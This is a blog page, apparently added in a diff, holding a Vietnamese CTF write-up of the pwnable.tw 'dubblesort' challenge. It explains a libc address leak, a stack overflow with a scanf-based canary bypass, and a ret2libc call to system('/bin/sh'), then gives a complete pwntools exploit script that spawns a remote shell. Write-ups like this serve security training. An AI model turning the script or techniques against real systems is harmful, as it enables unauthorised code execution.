@@ -1,0 +1,315 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.7.1 -->
+<title>dubblesort writeup | th3_5had0w</title>
+<meta name="generator" content="Jekyll v4.2.0" />
+<meta property="og:title" content="dubblesort writeup" />
+<meta name="author" content="th3_5had0w" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Dubblesort [200pts] (pwnable.tw)" />
+<meta property="og:description" content="Dubblesort [200pts] (pwnable.tw)" />
+<link rel="canonical" href="https://th3-5had0w.github.io/2020/12/24/dubblesort-writeup.html" />
+<meta property="og:url" content="https://th3-5had0w.github.io/2020/12/24/dubblesort-writeup.html" />
+<meta property="og:site_name" content="th3_5had0w" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2020-12-24T00:00:00+00:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="dubblesort writeup" />
+<script type="application/ld+json">
+{"datePublished":"2020-12-24T00:00:00+00:00","dateModified":"2020-12-24T00:00:00+00:00","mainEntityOfPage":{"@type":"WebPage","@id":"https://th3-5had0w.github.io/2020/12/24/dubblesort-writeup.html"},"@type":"BlogPosting","url":"https://th3-5had0w.github.io/2020/12/24/dubblesort-writeup.html","author":{"@type":"Person","name":"th3_5had0w"},"headline":"dubblesort writeup","description":"Dubblesort [200pts] (pwnable.tw)","@context":"https://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/css/style.css">
+  <link rel="icon" type="image/png" href="/assets/favicon.png" /><link type="application/atom+xml" rel="alternate" href="https://th3-5had0w.github.io/feed.xml" title="th3_5had0w" /></head>
+<body><div class="site-header">
+  <div class="wrapper">
+    <a class="site-title" rel="author" href="/">th3_5had0w<b class="command_prompt"></b><b class="blinking_cursor">_</b></a>
+    <span class="social_links">
+        <a class="color-cyan-hover" href="https://twitter.com/th3_5had0w_w"><i class="fab fa-twitter-square"></i></a><a class="color-yellow-hover" href="https://github.com/th3-5had0w"><i class="fab fa-github-square"></i></a>
+    </span>
+  </div>
+</div>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        
+  <div class="author-box">
+    
+    
+        <img src="
+            https://gravatar.com/avatar/4241e14141109999e63e51ba2f6eac59?s=256
+        " class="author-avatar" alt="Avatar" />
+    
+Hi, i'm th3_5had0w, nice to meet you, welcome to my darkness kingdom, where i often solve math problems and play ctf!
+
+</div>
+
+
+<div class="post">
+  <h1 class="post-title">dubblesort writeup</h1>
+  
+  <div class="post-tags">
+      
+      <a class="tag" href="/tag/pwnable.tw,/">pwnable.tw,</a>
+      
+      <a class="tag" href="/tag/heap/">heap</a>
+      
+      <a class="tag" href="/tag/exploit,/">exploit,</a>
+      
+      <a class="tag" href="/tag/pwn/">pwn</a>
+      
+  </div>
+  
+  <div class="post-date">Published on 24 Dec 2020</div>
+  
+  <h1 id="dubblesort-200pts-pwnabletw">Dubblesort [200pts] (pwnable.tw)</h1>
+
+<blockquote>
+  <p>Sort the memory!</p>
+
+  <p><code class="language-plaintext highlighter-rouge">nc chall.pwnable.tw 10101</code></p>
+
+  <p><a href="https://github.com/th3-5had0w/writeups/raw/main/dubblesort%5Bpwnable.tw%5D/dubblesort">dubblesort</a></p>
+
+  <p><a href="https://github.com/th3-5had0w/writeups/raw/main/dubblesort%5Bpwnable.tw%5D/libc_32.so.6">libc.so</a></p>
+</blockquote>
+
+<p><a href="https://github.com/th3-5had0w/writeups/raw/main/dubblesort%5Bpwnable.tw%5D/local_libc.so.6">Phiên bản libc local (Ubuntu 20.04)</a></p>
+
+<h2 id="những-đoạn-code-cần-lưu-ý">Những đoạn code cần lưu ý</h2>
+
+<h3 id="1-leak-libc">1) Leak libc</h3>
+
+<p><img src="https://github.com/th3-5had0w/writeups/blob/main/dubblesort%5Bpwnable.tw%5D/res/pic_1.png" alt="pic1" /></p>
+
+<h4 id="ở-đây-chương-trình-đọc-input-vào-nhưng-không-chặn-chuỗi-bằng-nullbyte-x00--ta-có-thể-nhập-các-kí-tự-để-hàm-printf-leak-được-địa-chỉ-của-libc">Ở đây chương trình đọc input vào nhưng không chặn chuỗi bằng nullbyte (<code class="language-plaintext highlighter-rouge">\x00</code>) =&gt; Ta có thể nhập các kí tự để hàm printf leak được địa chỉ của libc.</h4>
+
+<p><img src="https://github.com/th3-5had0w/writeups/blob/main/dubblesort%5Bpwnable.tw%5D/res/pic_3.png" alt="pic3" /></p>
+
+<h4 id="mình-đã-nhập-8-chữ-a-kèm-theo-kí-tự-enter-x0a-và-như-ảnh-trên-thì-có-thể-thấy-địa-chỉ-chỉ-libc-rất-gần-với-nơi-ta-nhập-input-1">Mình đã nhập 8 chữ <code class="language-plaintext highlighter-rouge">a</code> kèm theo kí tự enter <code class="language-plaintext highlighter-rouge">\x0a</code>, và như ảnh trên thì có thể thấy địa chỉ chỉ libc rất gần với nơi ta nhập input. (1)</h4>
+<h4 id="ngoài-ra-kí-tự-enter-của-mình-đã-ghi-đè-lên-byte-nullbyte-x00-của-libc-mà-printf-sẽ-in-các-bytes-ra-màn-hình-cho-đến-khi-gặp-kí-tự-nullbyte-x00-vì-kí-tự-enter-của-mình-đã-ghi-đè-lên-1-byte-x00-của-địa-chỉ-libc-nên-khi-leak-được-bạn-nhớ-trừ-đi-x0a-2">Ngoài ra kí tự enter của mình đã ghi đè lên byte nullbyte (<code class="language-plaintext highlighter-rouge">\x00</code>) của libc, mà printf sẽ in các bytes ra màn hình cho đến khi gặp kí tự nullbyte (<code class="language-plaintext highlighter-rouge">\x00</code>), vì kí tự enter của mình đã ghi đè lên 1 byte <code class="language-plaintext highlighter-rouge">\x00</code> của địa chỉ libc nên khi leak được bạn nhớ trừ đi <code class="language-plaintext highlighter-rouge">\x0a</code> (2)</h4>
+
+<h4 id="từ-1-và-2--ta-có-thể-leak-được-libc">Từ (1) và (2) =&gt; Ta có thể leak được libc.</h4>
+
+<h4 id="nhưng-đây-mới-chỉ-là-địa-chỉ-libc-nằm-tại-segment-gotplt-đã-được-map-để-tìm-địa-chỉ-libc-gốc-thì-ta-phải-lấy-địa-chỉ-vừa-leak-được-trừ-đi-địa-chỉ-chưa-được-map">Nhưng đây mới chỉ là địa chỉ libc nằm tại segment <code class="language-plaintext highlighter-rouge">.got.plt</code> đã được map, để tìm địa chỉ libc gốc thì ta phải lấy địa chỉ vừa leak được trừ đi địa chỉ chưa được map.</h4>
+
+<p><img src="https://github.com/th3-5had0w/writeups/blob/main/dubblesort%5Bpwnable.tw%5D/res/pic_7.png" alt="pic7" /></p>
+
+<h4 id="ở-đây-address-là-0x001eb000-vì-mình-đang-readelf-libc-local-của-mình-có-thể-address-ở-libc-bạn-sẽ-khác-và-address-ở-libc-của-remote-server-cũng-sẽ-khác">Ở đây address là 0x001eb000 vì mình đang readelf libc local của mình, có thể address ở libc bạn sẽ khác và address ở libc của remote server cũng sẽ khác.</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>địa chỉ libc gốc = địa chỉ libc đã leak - 0x001eb000 - 0x0a
+</code></pre></div></div>
+
+<h3 id="2-lỗi-tràn-bộ-nhớ-tại-đoạn-code-nhập-số-lượng-số-mà-ta-muốn-nhập-vào">2) Lỗi tràn bộ nhớ tại đoạn code nhập số lượng số mà ta muốn nhập vào</h3>
+
+<p><img src="https://github.com/th3-5had0w/writeups/blob/main/dubblesort%5Bpwnable.tw%5D/res/pic_2.png" alt="pic2" /></p>
+
+<h4 id="ở-đây-v4-chính-là-con-trỏ-của-v13-chương-trình-sẽ-hỏi-ta-muốn-nhập-bao-nhiêu-số-sau-mỗi-một-số-nhập-vào-thì-v4-sẽ-tăng-lên-1-có-nghĩa-là-vị-trí-của-con-trỏ-tăng-lên-4-vì-kích-cỡ-của-kiểu-int-nhưng-ở-đây-ta-không-hề-thấy-có-một-hàm-hay-dòng-lệnh-nào-để-kiểm-tra--khi-tăng-vị-trí-của-con-trỏ-lên-một-kích-cỡ-nhất-định-4n-thì-ta-sẽ-gặp-lỗi-buffer-overflow">Ở đây v4 chính là con trỏ của v13, chương trình sẽ hỏi ta muốn nhập bao nhiêu số, sau mỗi một số nhập vào thì v4 sẽ tăng lên 1, có nghĩa là <code class="language-plaintext highlighter-rouge">vị trí của con trỏ tăng lên 4</code> vì kích cỡ của kiểu <code class="language-plaintext highlighter-rouge">int</code>, nhưng ở đây ta không hề thấy có một hàm hay dòng lệnh nào để kiểm tra =&gt; Khi tăng vị trí của con trỏ lên một kích cỡ nhất định (4*n) thì ta sẽ gặp lỗi buffer overflow!</h4>
+
+<p><img src="https://github.com/th3-5had0w/writeups/blob/main/dubblesort%5Bpwnable.tw%5D/res/pic_4.png" alt="pic4" /></p>
+
+<h4 id="nhưng-ta-gặp-vấn-đề-là-chương-trình-này-có-bật-cơ-chế-stack-canary">Nhưng ta gặp vấn đề là chương trình này có bật cơ chế <code class="language-plaintext highlighter-rouge">Stack Canary</code>.</h4>
+
+<p><img src="https://github.com/th3-5had0w/writeups/blob/main/dubblesort%5Bpwnable.tw%5D/res/pic_5.png" alt="pic5" /></p>
+
+<h4 id="chương-trình-đọc-input-các-số-vào-bằng-hàm-scanf-nên-ta-có-thể-bypass-dễ-dàng-bằng-cách-nhập-các-kí-tự-như----vào-ô-dữ-liệu-nơi-chứa-stack-canary-cụ-thể-ở-đây-là-ở-số-thứ-25">Chương trình đọc input các số vào bằng hàm <code class="language-plaintext highlighter-rouge">scanf</code> nên ta có thể bypass dễ dàng bằng cách nhập các kí tự như <code class="language-plaintext highlighter-rouge">-, +,...</code> vào ô dữ liệu nơi chứa <code class="language-plaintext highlighter-rouge">Stack Canary</code>, cụ thể ở đây là ở số thứ 25.</h4>
+
+<p><img src="https://github.com/th3-5had0w/writeups/blob/main/dubblesort%5Bpwnable.tw%5D/res/pic_6.png" alt="pic6" /></p>
+
+<h4 id="như-trên-hình-thì-không-hề-có-cảnh-báo--stack-smashing-detected--vậy-là-ta-đã-bypass-được-stack-canary">Như trên hình thì không hề có cảnh báo <code class="language-plaintext highlighter-rouge">*** stack smashing detected ***</code>, vậy là ta đã bypass được <code class="language-plaintext highlighter-rouge">Stack Canary</code>.</h4>
+
+<h3 id="3-kết-luận">3) Kết luận</h3>
+
+<h4 id="vậy-là-ta-đã-leak-được-libc-và-bypass-được-stack-canary-để-điều-khiển-con-trỏ-rip">Vậy là ta đã leak được libc và bypass được <code class="language-plaintext highlighter-rouge">Stack Canary</code> để điều khiển con trỏ <code class="language-plaintext highlighter-rouge">RIP</code>.</h4>
+
+<h4 id="đây-là-chương-trình-chạy-kiến-trúc-x86-nên-theo-calling-convention-của-nó-ta-sẽ-truyền-vào-rip-theo-thứ-tự">Đây là chương trình chạy kiến trúc x86 nên theo calling convention của nó ta sẽ truyền vào <code class="language-plaintext highlighter-rouge">RIP</code> theo thứ tự:</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[RIP] = địa chỉ của hàm system
+[RIP+4] = tùy ý (đây là return pointer của hàm system, sau hàm system thì ta không cần return về đâu nữa vì đã có shell)
+[RIP+8] = địa chỉ của chuỗi /bin/sh (đây chính là tham số đầu tiên của hàm system)
+</code></pre></div></div>
+
+<h4 id="ta-cũng-cần-lưu-ý-về-cơ-chế-sort-của-chương-trình-để-tránh-giá-trị-của-canary-bị-sửa-đổi-ngoài-ý-muốn">Ta cũng cần lưu ý về cơ chế sort của chương trình để tránh giá trị của canary bị sửa đổi ngoài ý muốn.</h4>
+
+<h4 id="nhưng-ở-đây-thì-canary-địa-chỉ-của-hàm-system-và-địa-chỉ-của-chuỗi-binsh-đã-được-nhập-vào-theo-thứ-tự-từ-nhỏ-đến-lớn-ngay-từ-đầu">Nhưng ở đây thì canary, địa chỉ của hàm system và địa chỉ của chuỗi /bin/sh đã được nhập vào theo thứ tự từ nhỏ đến lớn ngay từ đầu.</h4>
+
+<h4 id="vậy-là-ta-đã-exploit-thành-công-chương-trình-đây-là-code-exploit-của-mình">Vậy là ta đã exploit thành công chương trình. Đây là code exploit của mình:</h4>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">debug</span> <span class="o">=</span> <span class="bp">False</span>
+
+<span class="k">if</span> <span class="p">(</span><span class="n">debug</span><span class="p">):</span>
+    <span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">'./dubblesort'</span><span class="p">)</span>
+    <span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">'/lib/i386-linux-gnu/libc.so.6'</span><span class="p">)</span>
+    <span class="n">offset</span> <span class="o">=</span> <span class="mh">0x001eb000</span>
+<span class="k">else</span><span class="p">:</span>
+    <span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">'chall.pwnable.tw'</span><span class="p">,</span> <span class="mi">10101</span><span class="p">)</span>
+    <span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">'libc_32.so.6'</span><span class="p">)</span>
+    <span class="n">offset</span> <span class="o">=</span> <span class="mh">0x001b0000</span>
+
+<span class="k">print</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="n">recv</span><span class="p">())</span>
+
+<span class="c1"># ----- leak libc ở local và ở remote vì phiên bản libc khác nhau -----
+</span>
+<span class="k">if</span> <span class="p">(</span><span class="n">debug</span><span class="p">):</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">'aaaaaaaa'</span><span class="p">)</span>
+    <span class="k">print</span><span class="p">(</span><span class="s">'trash: '</span><span class="p">,</span> <span class="n">io</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">14</span><span class="p">))</span>
+<span class="k">else</span><span class="p">:</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">'aaaaaaaaaaaaaaaaaaaaaaaa'</span><span class="p">)</span>
+    <span class="k">print</span><span class="p">(</span><span class="s">'trash: '</span><span class="p">,</span> <span class="n">io</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">30</span><span class="p">))</span>
+<span class="n">info</span> <span class="o">=</span> <span class="n">io</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="s">'raw: '</span><span class="p">,</span> <span class="n">info</span><span class="p">)</span>
+<span class="n">virtual_libc</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">info</span><span class="p">)</span><span class="o">-</span><span class="mh">0xa</span>
+<span class="k">print</span><span class="p">(</span><span class="s">'leaked: '</span><span class="p">,</span> <span class="nb">hex</span><span class="p">(</span><span class="n">virtual_libc</span><span class="p">))</span>
+<span class="k">print</span><span class="p">(</span><span class="s">'trash: '</span><span class="p">,</span> <span class="n">io</span><span class="p">.</span><span class="n">recv</span><span class="p">())</span>
+<span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">virtual_libc</span> <span class="o">-</span> <span class="n">offset</span>
+<span class="k">print</span><span class="p">(</span><span class="s">'base libc addr: '</span><span class="p">,</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">address</span><span class="p">))</span>
+<span class="k">print</span><span class="p">(</span><span class="s">'system: '</span><span class="p">,</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="s">'system'</span><span class="p">]))</span>
+<span class="k">print</span><span class="p">(</span><span class="s">'bin/sh: '</span><span class="p">,</span> <span class="nb">hex</span><span class="p">(</span><span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">search</span><span class="p">(</span><span class="sa">b</span><span class="s">'/bin/sh'</span><span class="p">))))</span>
+
+<span class="c1"># ---------------------------------------------------------------------
+</span>
+<span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">'35'</span><span class="p">)</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">24</span><span class="p">):</span>
+    <span class="k">print</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="n">recv</span><span class="p">())</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">'0'</span><span class="p">)</span>
+
+<span class="c1"># ----- bypassing stack canary -----
+</span>
+<span class="k">print</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="n">recv</span><span class="p">())</span>
+<span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">'-'</span><span class="p">)</span>
+
+<span class="c1"># ----------------------------------
+</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">32</span><span class="o">-</span><span class="mi">25</span><span class="p">):</span>
+    <span class="k">print</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="n">recv</span><span class="p">())</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="s">'system'</span><span class="p">]))</span>
+
+<span class="c1"># ----- điều khiển con trỏ RIP theo calling convention của cấu trúc x86 system_address -&gt; return_address -&gt; argument -----
+</span>
+<span class="k">print</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="n">recv</span><span class="p">())</span>
+<span class="k">print</span><span class="p">(</span><span class="s">'New RIP value: '</span><span class="p">,</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="s">'system'</span><span class="p">])</span>
+<span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="s">'system'</span><span class="p">]))</span>
+
+<span class="k">print</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="n">recv</span><span class="p">())</span>
+<span class="k">print</span><span class="p">(</span><span class="s">'Sending /bin/sh: '</span><span class="p">,</span> <span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">search</span><span class="p">(</span><span class="sa">b</span><span class="s">'/bin/sh'</span><span class="p">)))</span>
+<span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">search</span><span class="p">(</span><span class="sa">b</span><span class="s">'/bin/sh'</span><span class="p">))))</span>
+<span class="k">print</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="n">recv</span><span class="p">())</span>
+<span class="k">print</span><span class="p">(</span><span class="s">'Sending /bin/sh: '</span><span class="p">,</span> <span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">search</span><span class="p">(</span><span class="sa">b</span><span class="s">'/bin/sh'</span><span class="p">)))</span>
+<span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">search</span><span class="p">(</span><span class="sa">b</span><span class="s">'/bin/sh'</span><span class="p">))))</span>
+
+<span class="c1"># ------------------------------------------------------------------------------------------------------------------------
+</span>
+<span class="k">print</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="n">recv</span><span class="p">())</span>
+<span class="n">io</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div></div>
+
+</div>
+
+
+
+
+
+<div class="related">
+  <h2>related posts</h2>
+  <ul class="related-posts">
+    
+      <li>
+        <h3>
+          <a href="/2021/03/23/starting-my-new-blog.html">
+            New blog
+          </a>
+        </h3>
+      </li>
+    
+  </ul>
+</div>
+
+
+
+
+  
+  <h2>all tags</h2>
+  <div class="tag-cloud"><a href="/tag/exploit%2C/" class="set-5">exploit,</a> <a href="/tag/heap/" class="set-5">heap</a> <a href="/tag/introduction/" class="set-5">introduction</a> <a href="/tag/pwn/" class="set-5">pwn</a> <a href="/tag/pwnable.tw%2C/" class="set-5">pwnable.tw,</a></div>
+  
+
+
+
+      </div>
+    </main><footer class="site-footer">
+  <div class="wrapper">
+    <div class="credits"><a href="https://github.com/bitbrain/jekyll-dash">dash</a> theme for Jekyll by <a href="https://github.com/bitbrain">bitbrain</a> made with <i class="fas fa-heart"></i><div class="toggleWrapper">
+    <input type="checkbox" class="dn" id="theme-toggle" onclick="modeSwitcher()" checked />
+    <label for="theme-toggle" class="toggle">
+    <span class="toggle__handler">
+      <span class="crater crater--1"></span>
+      <span class="crater crater--2"></span>
+      <span class="crater crater--3"></span>
+    </span>
+        <span class="star star--1"></span>
+        <span class="star star--2"></span>
+        <span class="star star--3"></span>
+        <span class="star star--4"></span>
+        <span class="star star--5"></span>
+        <span class="star star--6"></span>
+    </label>
+</div>
+<script type="text/javascript">
+const theme = localStorage.getItem('theme');
+
+if (theme === "light") {
+    document.documentElement.setAttribute('data-theme', 'light');
+} else {
+    document.documentElement.setAttribute('data-theme', 'dark');
+}
+const userPrefers = getComputedStyle(document.documentElement).getPropertyValue('content');
+
+function activateDarkTheme() {
+    document.getElementById('theme-toggle').checked = true;
+    document.documentElement.setAttribute('data-theme', 'dark');
+    document.documentElement.classList.add('theme--dark');
+    document.documentElement.classList.remove('theme--light');
+	document.getElementById("theme-toggle").className = 'light';
+	window.localStorage.setItem('theme', 'dark');
+}
+
+function activateLightTheme() {
+    document.getElementById('theme-toggle').checked = false;
+    document.documentElement.setAttribute('data-theme', 'light');
+    document.documentElement.classList.add('theme--light');
+    document.documentElement.classList.remove('theme--dark');
+	document.getElementById("theme-toggle").className = 'dark';
+	window.localStorage.setItem('theme', 'light');
+}
+
+if (theme === "dark") {
+    activateDarkTheme();
+} else if (theme === "light") {
+    activateLightTheme();
+} else if  (userPrefers === "light") {
+    activateDarkTheme();
+} else {
+    activateDarkTheme();
+}
+
+function modeSwitcher() {
+	let currentMode = document.documentElement.getAttribute('data-theme');
+	if (currentMode === "dark") {
+	    activateLightTheme();
+	} else {
+	    activateDarkTheme();
+	}
+}
+</script></div>
+  </div>
+</footer>
+
+
+<script>
+      window.FontAwesomeConfig = {
+        searchPseudoElements: true
+      }
+    </script>
+  </body>
+
+</html>
